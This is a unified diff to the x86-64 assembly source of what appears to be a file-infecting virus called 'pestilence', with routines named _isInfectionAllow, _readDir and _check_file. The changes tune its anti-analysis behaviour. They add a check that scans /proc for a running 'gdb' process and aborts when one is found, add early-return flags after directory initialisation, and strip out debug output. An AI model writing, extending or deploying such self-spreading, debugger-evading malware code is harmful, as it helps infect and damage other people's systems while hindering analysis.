@@ -21,6 +21,8 @@ _start:
 	mov rdi, rax
     mov rdx, 0
 	call _initDir
+	cmp rax, 1
+	je _final_jmp
 
     call _isInfectionAllow
     test rax, rax
@@ -296,6 +298,8 @@ _readDir:
 
                 _callInit:
                     call _initDir
+					cmp rax, 1
+					je _returnClose
 
             _checkRead:
                 mov r8, FAM(pestilence.total_read)
@@ -305,12 +309,14 @@ _readDir:
                 jmp _listFile
 
     _returnClose:
+		push rax
 		mov rdi, FAM(pestilence.fd)
 		cmp qword rdi, 0
 		jle	_returnLeave
 		mov rax, SYS_CLOSE
 		syscall
 		or qword FAM(pestilence.fd), -1
+		pop rax
 		jmp _returnLeave
 
 _returnLeave:
@@ -343,29 +349,19 @@ _check_proc:
 	test rax, rax
 	jz _next
 
-	; push rdi
-	; mov rax, SYS_WRITE
-	; mov rdi, 0x1
-	; mov rsi, rsp
-	; mov rdx, 0x4
-	; syscall
-	; pop rdi
-	; _br_write:
-
 	mov rax, SYS_CLOSE
 	syscall 
 
-	; mov rbx, qword [rsp]
 	mov rbx, rsp
 	mov rbx, qword [rbx]
 	_cmpgdb:
 	cmp ebx, 0x0A626467
-	je _final_jmp
-	; je oui
+	je _procCLose
 	jmp _next
 
-	oui:
-		jmp _next
+_procCLose:
+	mov rax, 1	
+	jmp _returnClose
 
 _check_file:
 	push rbp
@@ -930,6 +926,8 @@ _isInfectionAllow:
         mov rsi, rsp
         mov rdx, 200
         xor r10, r10
+		xor r8, r8
+		xor r9,r9
         syscall
         test rax, rax
         js _allow
